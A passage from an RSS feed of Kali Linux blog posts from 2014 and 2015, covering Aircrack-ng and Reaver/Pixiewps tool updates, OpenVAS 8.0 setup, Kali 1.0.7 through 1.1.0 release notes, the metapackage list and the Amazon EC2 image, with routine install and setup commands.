Update</h2> <p><a href="https://www.kali.org/tools/aircrack-ng/">Aircrack-ng</a> is the de facto penetration tool suite - essential for any wireless penetration tests or assessments. In this latest Aircrack-ng release, amongst the normal bug fixes and code improvements there has been a significant change to <strong>airmon-ng</strong>, the tool used to put wireless cards into <em>monitor mode</em>. Other new and notable features are that <strong>airtun-ng</strong> is now able to decrypt WPA as well as several new <strong>airodump-ng</strong> flags, such as <em>- -wps</em> and <em>- -uptime.</em></p> <p><p> <a href='https://www.kali.org/blog/pixiewps-reaver-aircrack-ng-updates/images/airmon-ng-1.2rc2-kali-linux1.png'> <img src="https://www.kali.org/blog/pixiewps-reaver-aircrack-ng-updates/images/airmon-ng-1.2rc2-kali-linux1.png" alt="" /> </a> </p> </p> <p>Also notice the new naming convention of the wireless virtual interfaces - <strong>wlanXmon</strong>, as opposed to <strong>monX</strong>.</p> <h3 id="goodbye-mon0-hello-wlan0mon">Goodbye mon0, hello wlan0mon!</h3> <p>For the latest few releases, the <em>aircrack-ng</em> suite had bundled with it <strong>airmon-zc,</strong> which uses an improved method of placing wireless cards into monitor mode, as well as more verbose output options. With the release of Aircrack-ng 1.2 RC2, <strong>airmon-zc</strong> has officially replaced the original <strong>aircrack-ng</strong>, as the new standard.</p> <h3 id="more-verbose-airmon-ng-output">More verbose airmon-ng output</h3> <p>When things are going right, everything is great! However when this isn&rsquo;t the case, and you need to <a href="https://www.kali.org/docs/troubleshooting/troubleshooting-wireless-driver-issues/">troubleshoot wireless issues</a>, you can now use a single command <strong>airmon-ng &ndash;verbose start wlan0</strong> to gather all the relent information needed:</p> <pre><code class="language-console">root@kali:~# airmon-ng --verbose start wlan0 No interfering processes found No LSB modules are available. Distributor ID: Kali Description: Kali GNU/Linux 1.1.0 Release: 1.1.0 Codename: moto Linux kali 3.18.0-kali3-amd64 #1 SMP Debian 3.18.6-1~kali2 (2015-03-02) x86_64 GNU/Linux Detected VM using dmi_info This appears to be a VMware Virtual Machine If your system supports VT-d, it may be possible to use PCI devices If your system does not support VT-d, you can only use USB wifi cards K indicates driver is from 3.18.0-kali3-amd64 V indicates driver comes directly from the vendor, almost certainly a bad thing S indicates driver comes from the staging tree, these drivers are meant for reference not actual use, BEWARE ? indicates we do not know where the driver comes from... report this X[PHY]Interface Driver[Stack]-FirmwareRev Chipset Extended Info K[phy0]wlan0 rtl8187[mac80211]-N/A Realtek Semiconductor Corp. RTL8187 (mac80211 monitor mode vif enabled for [phy0]wlan0 on [phy0]wlan0mon) (mac80211 station mode vif disabled for [phy0]wlan0) root@kali:~# </code></pre> <p>You can find aircrack-ng&rsquo;s full change log at the following address: <a href="https://www.aircrack-ng.org/doku.php?id=Main#changelog">aircrack-ng.org/doku.php?id=Main#changelog</a>.</p> <h2 id="updated-reaver-wps-attack-tool">Updated Reaver WPS attack tool</h2> <p>The <a href="https://www.kali.org/tools/reaver/">reaver</a> project was originally developed by Craig Heffner, and the last release was 1.4. As the project seems to have been abandoned, several forks have cropped up - one belonging to a member of the Kali forums, <a href="https://forums.kali.org/member.php?31103-t6_x">t6_x</a>, who has also integrated the pixiewps attack into a newly minted 1.5.2 release. <a href="https://github.com/t6x/reaver-wps-fork-t6x">This new</a> version implements an array of improvements on the original version, and will hopefully be activity maintained by the community.</p> <h2 id="the-kali-community-rocks">The Kali Community Rocks</h2> <p>One of the advantages of being a Kali forum moderator is that you get to witness the community grow and interact. Since the original <a href="https://forums.kali.org/showthread.php?24286-WPS-Pixie-Dust-Attack-(Offline-WPS-Attack)">pixiewps thread</a> started by <a href="https://forums.kali.org/member.php?17496-soxrok2212">soxrok2212</a>, it has received over 300 responses, bringing about the implementation of new ideas and updates to the tool. Watching this project emerge from a single forum post all the way to the release of the tool, and seeing the co-operation between the various tool developers while working to get interoperability between their tools was a real privilege.</p> <h2 id="stay-fresh-with-kali-linux">Stay fresh with Kali-Linux</h2> <p>You don&rsquo;t need to do anything special to get this awesome tool chain, just keep your Kali-Linux up-to-date:</p> <pre><code class="language-sh">apt-get update apt-get dist-upgrade </code></pre> <p>Happy penetration testing!</p></description>
</item>
<item>
<title>OpenVAS 8.0 Vulnerability Scanning</title>
<link>https://www.kali.org/blog/openvas-vulnerability-scanning/</link>
<guid isPermaLink="true">https://www.kali.org/blog/openvas-vulnerability-scanning/</guid>
<pubDate>Mon, 27 Apr 2015 00:00:00 +0000</pubDate>
<updated>Mon, 17 Jan 2022 00:00:00 +0000)</updated>
<enclosure url="https://www.kali.org/blog/openvas-vulnerability-scanning/images/kali-openvas.jpg" type="image/jpg"/>
<description><p><strong>Vulnerability scanning</strong> is a crucial phase of a penetration test and having an updated vulnerability scanner in your security toolkit can often make a real difference by helping you discover overlooked vulnerable items. For this reason, we&rsquo;ve manually packaged the latest and newly released <a href="https://www.openvas.org/">OpenVAS</a> 8.0 tool and libraries for Kali Linux. Although nothing major has changed in this release in terms of running the vulnerability scanner, we wanted to give a quick overview on how to get it up and running.</p> <h2 id="setting-up-kali-for-vulnerability-scanning">Setting up Kali for Vulnerability Scanning</h2> <p>If you haven&rsquo;t already, make sure your Kali is up-to-date and install the latest OpenVAS. Once done, run the <strong>openvas-setup</strong> command to setup OpenVAS, download the latest rules, create an admin user, and start up the various services. Depending on your bandwidth and computer resources, this could take a while:</p> <pre><code class="language-console">root@kali:~# apt-get update root@kali:~# apt-get dist-upgrade root@kali:~# apt-get install openvas root@kali:~# openvas-setup /var/lib/openvas/private/CA created /var/lib/openvas/CA created [i] This script synchronizes an NVT collection with the 'OpenVAS NVT Feed'. [i] Online information about this feed: 'https://www.openvas.org/openvas-nvt-feed ... sent 1143 bytes received 681741238 bytes 1736923.26 bytes/sec total size is 681654050 speedup is 1.00 [i] Initializing scap database [i] Updating CPEs [i] Updating /var/lib/openvas/scap-data/nvdcve-2.0-2002.xml [i] Updating /var/lib/openvas/scap-data/nvdcve-2.0-2003.xml ... Write out database with 1 new entries Data Base Updated Restarting Greenbone Security Assistant: gsad. User created with password '6062d074-0a4c-4de1-a26a-5f9f055b7c88'. </code></pre> <p>Once <strong>openvas-setup</strong> completes its process, the OpenVAS manager, scanner, and GSAD services should be listening:</p> <pre><code class="language-console">root@kali:~# netstat -antp Active Internet connections (servers and established) Proto Recv-Q Send-Q Local Address Foreign Address State PID/Program name tcp 0 0 127.0.0.1:9390 0.0.0.0:* LISTEN 9583/openvasmd tcp 0 0 127.0.0.1:9391 0.0.0.0:* LISTEN 9570/openvassd: Wai tcp 0 0 127.0.0.1:9392 0.0.0.0:* LISTEN 9596/gsad </code></pre> <h3 id="starting-the-openvas-services">Starting the OpenVAS services</h3> <p>If you have already configured OpenVAS, you can simply start all the necessary services by running <strong>openvas-start</strong>:</p> <pre><code class="language-console">root@kali:~# openvas-start Starting OpenVas Services Starting Greenbone Security Assistant: gsad. Starting OpenVAS Scanner: openvassd. Starting OpenVAS Manager: openvasmd. </code></pre> <p><em>If you need to troubleshoot any issues, you can use <strong>openvas-check-setup</strong> to identity the problem.</em></p> <h3 id="connecting-to-the-openvas-web-interface">Connecting to the OpenVAS Web Interface</h3> <p>Point your browser to <strong>https://127.0.0.1:9392</strong>, accept the self signed SSL certificate and plugin the credentials for the <strong>admin</strong> user. The admin password was generated during the setup phase (look at the output above if you missed it).</p> <p><p> <a href='https://www.kali.org/blog/openvas-vulnerability-scanning/images/openvas_web_small.png'> <img src="https://www.kali.org/blog/openvas-vulnerability-scanning/images/openvas_web_small.png" alt="" /> </a> </p> </p> <p>That&rsquo;s it! Now OpenVAS is ready for you to configure it and run a scan against a given IP or range. Happy vulnerability scanning!</p></description>
</item>
<item>
<title>Kali Linux 1.1.0 Release</title>
<link>https://www.kali.org/blog/kali-linux-1-1-0-release/</link>
<guid isPermaLink="true">https://www.kali.org/blog/kali-linux-1-1-0-release/</guid>
<pubDate>Mon, 09 Feb 2015 00:00:00 +0000</pubDate>
<updated>Mon, 17 Jan 2022 00:00:00 +0000)</updated>
<enclosure url="https://www.kali.org/blog/kali-linux-1-1-0-release/images/kali-1.1.0-release.jpg" type="image/jpg"/>
<description><p>After almost two years of public development (and another year behind the scenes), we are proud to announce our first point release of <a href="https://www.kali.org/blog/kali-linux-1-1-0-release/"><strong>Kali Linux - version 1.1.0</strong></a>. This release brings with it a mix of unprecedented hardware support as well as rock solid stability. For us, this is a real milestone as this release epitomizes the benefits of our move from <a href="https://www.backtrack-linux.org/">BackTrack</a> to Kali Linux over two years ago. As we look at a now mature Kali, we see a versatile, flexible Linux distribution, rich with useful security and <a href="https://www.kali.org/features/">penetration testing related features</a>, running on all sorts of weird and wonderful <a href="https://gitlab.com/kalilinux/build-scripts/kali-arm">ARM hardware</a>. But enough talk, here are the goods:</p> <ul> <li>The new release runs a 3.18 kernel, patched for wireless injection attacks.</li> <li>Our ISO build systems are now running off live-build 4.x.</li> <li>Improved wireless driver support, due to both kernel and firmware upgrades.</li> <li>NVIDIA Optimus hardware support.</li> <li>Updated virtualbox-tool, openvm-tools and <a href="https://www.kali.org/docs/virtualization/install-vmware-guest-tools/">vmware-tools packages and instructions</a>.</li> <li>A whole bunch of fixes and updates from our bug-tracker <a href="https://bugs.kali.org/changelog_page.php">changelog</a>.</li> <li>And most importantly, we changed grub screens and wallpapers!</li> </ul> <h3 id="download-or-upgrade-kali-linux-110">Download or Upgrade Kali Linux 1.1.0</h3> <p><p> <a href='https://www.kali.org/blog/kali-linux-1-1-0-release/images/kali-wallpaper-2015-v1.1.0.png'> <img src="https://www.kali.org/blog/kali-linux-1-1-0-release/images/kali-wallpaper-2015-v1.1.0.png" alt="" /> </a> </p> </p> <p>page in the next few days. As usual, if you&rsquo;ve already got Kali Linux installed and running, there&rsquo;s no need to re-download the image as you can simply update your existing operating system using simple <strong>apt</strong> commands:</p> <pre><code class="language-sh">apt-get update apt-get dist-upgrade </code></pre> <h3 id="shameless-offsec-plug">Shameless OffSec Plug</h3> <p>Last month, <a href="https://www.offsec.com/">OffSec</a> put out a promotional video as well as a motivational song in praise of its flagship <a href="https://www.offsec.com/pwk-oscp/">Penetration Testing with Kali Linux</a> certification, the <a href="https://www.offsec.com/pwk-oscp/">OSCP</a>. People liked them so much, we thought we&rsquo;d share them here too:</p> <h5 id="call-offsec---promotional-video">CALL OFFSEC - Promotional Video</h5> <div style="position: relative; padding-bottom: 56.25%; height: 0; overflow: hidden;"> <iframe src="https://www.kali.org/blog/kali-linux-1-1-0-release/https://player.vimeo.com/video/115074667?dnt=1" style="position: absolute; top: 0; left: 0; width: 100%; height: 100%; border:0;" title="vimeo video" webkitallowfullscreen mozallowfullscreen allowfullscreen></iframe> </div> <h5 id="offsec-say-try-harder---oscp-motivational-song">OFFSEC SAY &ldquo;TRY HARDER!&rdquo; - OSCP Motivational Song</h5> <p>&ldquo;OffSec say Try Harder, the only way to get your OSCP!&rdquo;. This is our new OSCP anthem for all struggling students. The lyrics for the &ldquo;Try Harder&rdquo; song can be found on the latest OffSec &ldquo;<a href="https://www.offsec.com/offsec/say-try-harder/">Try Harder</a>&rdquo; blog post. Enjoy!</p> <p><a href="audio/Try_Harder_2.0.mp3">Try Harder (mp3)</a></p> <figure > <audio controls preload="metadata"> <source src="https://www.kali.org/blog/kali-linux-1-1-0-release/audio/Try_Harder_2.0.mp3" type="audio/mpeg"> </audio> </figure></description>
</item>
<item>
<title>Kali & NetHunter Security Release Fixes</title>
<link>https://www.kali.org/blog/kali-linux-1-0-9a-release/</link>
<guid isPermaLink="true">https://www.kali.org/blog/kali-linux-1-0-9a-release/</guid>
<pubDate>Mon, 06 Oct 2014 00:00:00 +0000</pubDate>
<updated>Mon, 17 Jan 2022 00:00:00 +0000)</updated>
<enclosure url="https://www.kali.org/blog/kali-linux-1-0-9a-release/images/kali-1.0.9a-release.jpg" type="image/jpg"/>
<description><h3 id="squash-the-bugs-with-kali-109a">Squash the Bugs with Kali 1.0.9a</h3> <p>Over the past couple of weeks, we&rsquo;ve seen a bunch of nasty bugs hit the scene, from <strong>shellshock</strong> to Debian <strong><a href="https://www.debian.org/security/2014/dsa-3025">apt</a></strong> vulnerabilities. As we prefer not to ship vulnerable ISOs, we&rsquo;ve rolled up new images for our Kali Linux and NetHunter releases as well our Amazon AWS images with the relevant security fixes in place. These images correspond to Kali 1.0.9a and <a href="https://www.offsec.com/offsec/kali-nexus-nethunter-1-0-2/">NetHunter 1.0.2</a> versions, now available for <a href="https://www.kali.org/get-kali/">download</a> through our mirrors. We expect the Amazon images to be updated in the AWS backend by the end of the week. If you&rsquo;re already running Kali Linux, all you need to do is run an update and dist-upgrade to get the latest and greatest:</p> <pre><code class="language-sh">apt-get update apt-get dist-upgrade </code></pre> <h3 id="nethunter-for-professional-penetration-testing">NetHunter for Professional Penetration Testing</h3> <p><p> <a href='https://www.kali.org/blog/kali-linux-1-0-9a-release/images/nethunter-demo-homescreen-thumb.png'> <img src="https://www.kali.org/blog/kali-linux-1-0-9a-release/images/nethunter-demo-homescreen-thumb.png" alt="" /> </a> </p> </p> <p>The <a href="https://www.kali.org/kali-nethunter/">OffSec NetHunter</a> release was a success and has brought about a huge amount of interest in our Nexus ROM overlay. We are happy and thankful to see a NetHunter community spring up and <a href="https://www.kali.org/docs/community/contribute/">contribute</a> to the project so actively. Since the release, we have been repeatedly asked about our <a href="https://www.kali.org/docs/policy/eula/EULA.txt">Kali EULA</a> and whether NetHunter can be used for <strong>commercial purposes</strong> such as professional penetration testing or running security assessments. <strong>The answer is a resounding YES</strong>, currently making NetHunter the only free Nexus Android system which is Open-source and allowed for commercial use. If you&rsquo;re doing any serious work with NetHunter, make sure it is <a href="https://forums.kali.org/showthread.php?23022-Securing-your-NetHunter-Device">properly secured</a> and <a href="https://forums.kali.org/showthread.php?22901-NetHunter-Disk-Encryption">encrypted</a>.</p> <h3 id="kali-linux-tools-listings">Kali Linux Tools Listings</h3> <p>A month ago, we released the Kali Linux Tools website, detailing the tools available in Kali as well as simple usage examples. If you are the author of a tool that we have missed or have additional examples that you would like us to include in order to more fully cover your project, please feel free to <a href="https://www.kali.org/contact/">contact us</a> to have your entries fixed.</p></description>
</item>
<item>
<title>Kali Tools Website Launched, 1.0.9 Release</title>
<link>https://www.kali.org/blog/kali-linux-1-0-9-release/</link>
<guid isPermaLink="true">https://www.kali.org/blog/kali-linux-1-0-9-release/</guid>
<pubDate>Mon, 25 Aug 2014 00:00:00 +0000</pubDate>
<updated>Mon, 17 Jan 2022 00:00:00 +0000)</updated>
<enclosure url="https://www.kali.org/blog/kali-linux-1-0-9-release/images/kali-1.0.9-release.jpg" type="image/jpg"/>
<description><p>Now that we have caught our breath after the Black Hat and DEF CON conferences, we have put aside some time to fix an annoying bug in our 1.0.8 ISO releases related to outdated firmware as well as regenerate fresh new ARM and VMware images (courtesy of <a href="https://www.offsec.com/">OffSec</a> ) for our new <a href="https://www.kali.org/get-kali/#kali-vm">1.0.9 release</a>. With this release come a few more updates worth mentioning:</p> <h5 id="rasberry-pi-b-arm-image-support">Rasberry Pi B+ ARM Image Support</h5> <p>We are pleased to announce that we have updated our Raspberry Pi Kali image to support the new B+ model so that now it works out of the box. This single image now supports all Raspberry Pi models.</p> <h5 id="odroid-u3-cubox-i-arm-images-added">Odroid U3, Cubox-i ARM Images Added</h5> <p>We have also included two more images to our Kali ARM image collection for the Odroid U3 and Cubox-i ARM computers. Each of these have interesting use cases as both their small form factor and specs are formidable. All of these news scripts can be found in our <a href="https://gitlab.com/kalilinux/build-scripts/kali-arm">OffSec GitHub</a> page.</p> <h5 id="new-kali-tools-website">New Kali Tools Website!</h5> <p>After many months of typing, editing, and testing, we are delighted to announce the launch of our new <a href="https://www.kali.org/tools/">Kali Linux Tools</a> website. This new site is our official home for information on all of the tools included in Kali Linux. For each tool, you will find a description of the tool, links to the tool homepage, author and license information, and usage output so you can see what output you can expect from each utility in Kali.</p> <p>In addition to the primary listing of all <a href="https://www.kali.org/tools/">Kali tools</a>, we have also made an effort to use tags throughout the site so you can more easily find a particular tool based on what it can do. You will find a tag cloud at the bottom of each page as you navigate the site. Also available is a full breakdown of the contents of each <a href="https://www.kali.org/docs/general-use/metapackages/">Kali Linux metapackage</a>, allowing you to see which tool is included in a particular metapackage, which makes the building of <a href="https://www.kali.org/docs/development/live-build-a-custom-kali-iso/">custom ISOs</a> much easier.</p> <p>We hope you enjoy our new Kali Linux Tools site and find it as useful as we do. If you are a tool author and have additional examples that you would like us to include in order to more fully cover your project, please feel free to <a href="https://www.kali.org/contact/">contact us</a>.</p> <h5 id="looking-towards-the-future">Looking towards the future</h5> <p>We have a massive set of of surprises in the works, some of which will be revealed in <a href="http://2014.brucon.org/index.php/Training_Kali_Linux_Dojo">Brucon</a> and <a href="https://www.derbycon.com/2014/08/11/kali-linux-dojo-at-derbycon/">Derbycon</a>, where we&rsquo;ll be running our second <a href="https://www.kali.org/docs/development/dojo-mastering-live-build/">Kali Linux Dojo</a>. See you there!</p></description>
</item>
<item>
<title>Kali Linux 1.0.8 Release with EFI Boot Support</title>
<link>https://www.kali.org/blog/kali-linux-1-0-8-release/</link>
<guid isPermaLink="true">https://www.kali.org/blog/kali-linux-1-0-8-release/</guid>
<pubDate>Tue, 22 Jul 2014 00:00:00 +0000</pubDate>
<updated>Mon, 17 Jan 2022 00:00:00 +0000)</updated>
<enclosure url="https://www.kali.org/blog/kali-linux-1-0-8-release/images/kali-1.0.8-release.jpg" type="image/jpg"/>
<description><p>The long awaited Kali Linux USB EFI boot support feature has been added to our binary ISO builds, which has prompted this early Kali Linux 1.0.8 release. This new feature simplifies getting Kali installed and running on more recent hardware which requires EFI as well as various Apple Macbooks Air and Retina models. Besides the addition of EFI support, there is a whole array of <a href="https://bugs.kali.org/changelog_page.php">tool updates and fixes</a> that have accumulated over the past couple of months.</p> <p>As this new release focuses almost entirely on the EFI capable ISO image, OffSec won&rsquo;t be releasing additional ARM or VMWare images with 1.0.8. As usual, you don&rsquo;t need to re-download Kali if you&rsquo;ve got it installed, and apt-get update &amp;&amp; apt-get dist-upgrade should do the job.</p> <h5 id="shameless-plug-for-our-free-kali-dojo">Shameless Plug for Our Free Kali Dojo</h5> <p><p> <a href='https://www.kali.org/blog/kali-linux-1-0-8-release/images/kali-home-large-slider-dojo-orange.png'> <img src="https://www.kali.org/blog/kali-linux-1-0-8-release/images/kali-home-large-slider-dojo-orange.png" alt="" /> </a> </p> </p> <p>Finally, this release comes a couple of weeks before the 2014 Black Hat and Defcon security conferences in Las Vegas. If you&rsquo;re attending these conferences, don&rsquo;t forget to join our one day, free [Kali Linux Dojo workshop](](/docs/development/dojo-mastering-live-build/), where we will be teaching and demonstrating the awesome stuff you can do with the Kali Linux Distribution. It&rsquo;s going to be intensive and hands on, so you&rsquo;ll need to <a href="https://www.offsec.com/kali-linux/kali-linux-workshop/">bring some stuff with you</a> if you attend. <strong>We expect this to be one of our most engaging and interesting events ever!</strong></p> <h5 id="kali-linux-a-penetration-testing-platform">Kali Linux, a Penetration Testing Platform</h5> <p>While keeping an up-to-date toolset is most definitely an important part of any security distribution, much of our resources are also spent on building, testing and fixing <a href="https://www.kali.org/docs/">useful features</a> for individuals in the Security and Forensics fields. Building on our ever-growing list of such features, we can now happily say that <strong>the Kali image is a EFI Bootable ISO Hybrid image that supports Live USB Encrypted Persistence with LUKS Nuke support</strong>, out of the box. Yippie!</p></description>
</item>
<item>
<title>Kali Linux 1.0.7 Release</title>
<link>https://www.kali.org/blog/kali-linux-1-0-7-release/</link>
<guid isPermaLink="true">https://www.kali.org/blog/kali-linux-1-0-7-release/</guid>
<pubDate>Tue, 27 May 2014 00:00:00 +0000</pubDate>
<updated>Mon, 17 Jan 2022 00:00:00 +0000)</updated>
<enclosure url="https://www.kali.org/blog/kali-linux-1-0-7-release/images/kali-1.0.7-release.jpg" type="image/jpg"/>
<description><h4 id="kernel-314-tool-updates-package-improvements">Kernel 3.14, Tool Updates, Package Improvements</h4> <p>Kali Linux 1.0.7 has just been released, complete with a whole bunch of tool updates, a new kernel, and some cool new features. Check out our <a href="https://bugs.kali.org/changelog_page.php">changelog</a> for a full list of these items. As usual, you don&rsquo;t need to re-download or re-install Kali to benefit from these updates - you can update to the latest and greatest using these simple commands:</p> <pre><code class="language-sh">apt-get update apt-get dist-upgrade # If you've just updated your kernel, then: reboot </code></pre> <h4 id="kali-linux-encrypted-usb-persistence">Kali Linux Encrypted USB Persistence</h4> <p>One of the new sought out features introduced (which is also partially responsible for the kernel update) is the ability to create <a href="https://www.offsec.com/kali-linux/kali-encrypted-usb-persistence/">Kali Linux Live USB with LUKS Encrypted Persistence</a>. This feature ushers in a new era of secure Kali Linux USB portability, allowing us to either boot to a &ldquo;clean&rdquo; Kali image or alternatively, overlay it with the contents of a persistent encrypted partition, all within the same USB drive.</p> <h4 id="tool-developers-ahoy">Tool Developers Ahoy!</h4> <p>This release also marks the beginning of some co-ordinated efforts between Kali developers and tool developers to make sure their tools are represented correctly and are fully functional within Kali Linux. We would like to thank the metasploit, w3af, and wpscan dev teams for working with us to perfect their Kali packages and hope that more tool developers join in. Tool developers are welcome to send us an email to:</p> <p><p> <a href='https://www.kali.org/blog/kali-linux-1-0-7-release/images/info-email-fix.png'> <img src="https://www.kali.org/blog/kali-linux-1-0-7-release/images/info-email-fix.png" alt="" /> </a> </p> </p> <p>and we&rsquo;ll be happy to work with you to better integrate your tool into Kali.</p> <h4 id="kali-linux-greater-than-the-sum-of-its-parts">Kali Linux: Greater Than the Sum of its Parts</h4> <p>For quite some time now, we&rsquo;ve been preaching that Kali Linux is more than a &ldquo;Linux distribution with a collection of tools in it&rdquo;. We invest a significant amount of time and resources developing and enabling features in the distribution which we think are useful for penetration testers and other security professionals. These features range from things like &ldquo;<strong>live-build</strong>&rdquo;, which allows our end users to easily customize their own Kali ISOs, to features like <strong>Live USB persistence encryption</strong>, which provides paranoid users with an extra layer of security. Many of these features are unique to Kali and can be found nowhere else. We&rsquo;ve started tallying these features and linking them from our <a href="https://www.kali.org/docs/">Kali documentation page</a> - check it out, it&rsquo;s growing to be an impressive list!</p> <h4 id="torrents-virtual-machine--arm-images">Torrents, Virtual Machine &amp; ARM images</h4> <p>In the next few days, <a href="https://www.offsec.com/">OffSec</a> will post Virtual Machine and custom ARM images for the 1.0.7 release. We will announce the availability of these images via our <a href="https://www.offsec.com/blog/">blog</a> and <a href="https://twitter.com/offsectraining">Twitter</a> feeds, so stay tuned!.</p></description>
</item>
<item>
<title>Kali Linux Metapackages</title>
<link>https://www.kali.org/blog/kali-linux-metapackages/</link>
<guid isPermaLink="true">https://www.kali.org/blog/kali-linux-metapackages/</guid>
<pubDate>Wed, 26 Feb 2014 00:00:00 +0000</pubDate>
<updated>Mon, 17 Jan 2022 00:00:00 +0000)</updated>
<enclosure url="https://www.kali.org/blog/kali-linux-metapackages/images/kali-meta-packages.jpg" type="image/jpg"/>
<description><p>One of our goals when developing Kali Linux was to provide multiple <a href="https://gitlab.com/kalilinux/packages/kali-meta.git">metapackages</a> that would allow us to easily install subsets of tools based on their particular needs. Until recently, we only had a handful of these meta packages but we have since expanded the <a href="https://www.kali.org/docs/general-use/metapackages/">metapackage list</a> to include far more options:</p> <ul> <li>kali-linux</li> <li>kali-linux-all</li> <li>kali-linux-forensic</li> <li>kali-linux-full</li> <li>kali-linux-gpu</li> <li>kali-linux-pwtools</li> <li>kali-linux-rfid</li> <li>kali-linux-sdr</li> <li>kali-linux-top10</li> <li>kali-linux-voip</li> <li>kali-linux-web</li> <li>kali-linux-wireless</li> </ul> <p>These metapackages allow for easy installation of certain tools in a specific field, or alternatively, for the installation of a full Kali suite. All of the Kali metapackages follow a particular naming convention, starting with &ldquo;kali-linux&rdquo; so if you want to see which metapackages are available, you can search for them as follows:</p> <pre><code class="language-sh">apt-get update &amp;&amp; apt-cache search kali-linux </code></pre> <p>Although we tried to make the metapackage names self-explanatory, we are limited in the practical length we can use, so let&rsquo;s take a brief look at each of them and see how much disk space is used by each one:</p> <h5 id="kali-linux">kali-linux</h5> <p>The <em><strong>kali-linux</strong></em> metapackage is a completely bare-bones installation of Kali Linux and includes various network services such as Apache and SSH, the Kali kernel, and a number of version control applications like git, svn, etc. All of the other metapackages listed below also contain <em><strong>kali-linux</strong></em>. <strong>Installation Size:</strong> 1.5 GB</p> <h5 id="kali-linux-full">kali-linux-full</h5> <p>When you <a href="https://www.kali.org/get-kali/">download</a> a Kali Linux ISO, you are essentially downloading an installation that has the <em><strong>kali-linux-full</strong></em> metapackage installed. This package includes all of the tools you are familiar with in Kali. <strong>Installation Size:</strong> 9.0 GB</p> <h5 id="kali-linux-all">kali-linux-all</h5> <p>In order to keep our ISO sizes reasonable, we are unable to include every single tool that we package for Kali and there are a number of tools that are not able to be used depending on hardware, such as various GPU tools. If you want to install every available Kali Linux package, you can install the <em><strong>kali-linux-all</strong></em> metapackage. <strong>Installation Size:</strong> 15 GB</p> <h5 id="kali-linux-top10">kali-linux-top10</h5> <p>In Kali Linux, we have a sub-menu called &ldquo;Top 10 Security Tools&rdquo;. The <em><strong>kali-linux-top10</strong></em> metapackage will install all of these tools for you in one fell swoop. <strong>Installation Size:</strong> 3.5 GB</p> <p><p> <a href='https://www.kali.org/blog/kali-linux-metapackages/images/top10-menu.png'> <img src="https://www.kali.org/blog/kali-linux-metapackages/images/top10-menu.png" alt="" /> </a> </p> </p> <h5 id="kali-linux-forensic">kali-linux-forensic</h5> <p>If you are doing forensics work, you don&rsquo;t want your analysis system to contain a bunch of unnecessary tools. To the rescue comes the <em><strong>kali-linux-forensic</strong></em> metapackage, which only contains the forensics tools in Kali. <strong>Installation Size:</strong> 3.1 GB</p> <h5 id="kali-linux-gpu">kali-linux-gpu</h5> <p>GPU utilities are very powerful but need special hardware in order to function correctly. For this reason, they are not included in the default Kali Linux installation but you can install them all at once with <em><strong>kali-linux-gpu</strong></em> and get cracking. <strong>Installation Size:</strong> 4.8 GB</p> <h5 id="kali-linux-pwtools">kali-linux-pwtools</h5> <p>The <em><strong>kali-linux-pwtools</strong></em> metapackage contains over 40 different password cracking utilities as well as the GPU tools contained in <em><strong>kali-linux-gpu</strong></em>. <strong>Installation Size:</strong> 6.0 GB</p> <h5 id="kali-linux-rfid">kali-linux-rfid</h5> <p>For our users who are doing RFID research and exploitation, we have the <em><strong>kali-linux-rfid</strong></em> metapackage containing all of the RFID tools available in Kali Linux. <strong>Installation Size:</strong> 1.5 GB</p> <h5 id="kali-linux-sdr">kali-linux-sdr</h5> <p>The <em><strong>kali-linux-sdr</strong></em> metapackage contains a large selection of tools for your Software Defined Radio hacking needs. <strong>Installation Size:</strong> 2.4 GB</p> <h5 id="kali-linux-voip">kali-linux-voip</h5> <p>Many people have told us they use Kali Linux to conduct VoIP testing and research so they will be happy to know we now have a dedicated <em><strong>kali-linux-voip</strong></em> metapackage with 20+ tools. <strong>Installation Size:</strong> 1.8 GB</p> <h5 id="kali-linux-web">kali-linux-web</h5> <p>Web application assessments are very common in the field of penetration testing and for this reason, Kali includes the <em><strong>kali-linux-web</strong></em> metapackage containing dozens of tools related to web application hacking. <strong>Installation Size:</strong> 4.9 GB</p> <h5 id="kali-linux-wireless">kali-linux-wireless</h5> <p>Like web applications, many penetration testing assessments are targeted towards wireless networks. The <em><strong>kali-linux-wireless</strong></em> metapackage contains all the tools you&rsquo;ll need in one easy to install package. <strong>Installation Size:</strong> 6.6 GB</p> <p>To see the list of tools included in a metapackage, you can use simple <strong>apt</strong> commands. For example, to list all the tools included in the <strong>kali-linux-web</strong> metapackage, we could:</p> <pre><code class="language-sh">apt-cache show kali-linux-web | grep Depends </code></pre></description>
</item>
<item>
<title>Kali Linux Amazon EC2 AMI</title>
<link>https://www.kali.org/blog/kali-linux-amazon-ec2-ami/</link>
<guid isPermaLink="true">https://www.kali.org/blog/kali-linux-amazon-ec2-ami/</guid>
<pubDate>Mon, 20 Jan 2014 00:00:00 +0000</pubDate>
<updated>Mon, 17 Jan 2022 00:00:00 +0000)</updated>
<enclosure url="https://www.kali.org/blog/kali-linux-amazon-ec2-ami/images/kali-in-the-cloud.jpg" type="image/jpg"/>
<description><h3 id="kali-linux-in-the-amazon-ec2-marketplace">Kali Linux in the Amazon EC2 Marketplace</h3> <p><strong>EDIT</strong>: For updated Kali Rolling images in the Amazon AWS, check <a href="https://www.kali.org/blog/kali-linux-aws-cloud/">this post</a>.</p> <p>After several weeks of &ldquo;back and forth&rdquo; with the Amazon EC2 team, Kali Linux has finally been approved into the Amazon EC2 marketplace. This means that our users can now activate and access Kali Linux instances in the Amazon cloud quickly and easily. We are &ldquo;selling&rdquo; these images on the marketplace for <strong>free</strong>, so other than the regular amazon charges, there no extras to pay. We have currently published a single 64 bit <a href="https://aws.amazon.com/marketplace/pp/B08LL91KKB">minimal instance of Kali Linux</a>, which can be found in the marketplace by searching for &ldquo;Kali Linux&rdquo; or accessed via its <a href="https://aws.amazon.com/marketplace/pp/B08LL91KKB">direct link</a>.</p> <p><p> <a href='https://www.kali.org/blog/kali-linux-amazon-ec2-ami/images/amazon-kali-marketplace.png'> <img src="https://www.kali.org/blog/kali-linux-amazon-ec2-ami/images/amazon-kali-marketplace.png" alt="" /> </a> </p> </p> <p>Due to Amazon AMI image guidelines, the instance does not use the root account by default. Once you have obtained your SSH key from Amazon, you need to connect to your instance using the &ldquo;kali&rdquo; user, from which you can then sudo to root if needed. The image is a barebones Kali installation, allowing you to install any toolset you like, while still remaining small and lightweight. If you plan on using Kali Linux for any aggressive scanning on the Internet, make sure to update the Amazon security team through their <a href="https://aws.amazon.com/security/penetration-testing/">Penetration Testing Request</a> form.</p> <h3 id="build-your-own-kali-images-in-the-amazon-cloud">Build Your Own Kali Images in the Amazon Cloud</h3> <p>If you would like to build your own Kali Linux Amazon Machine Images, you can use our <a 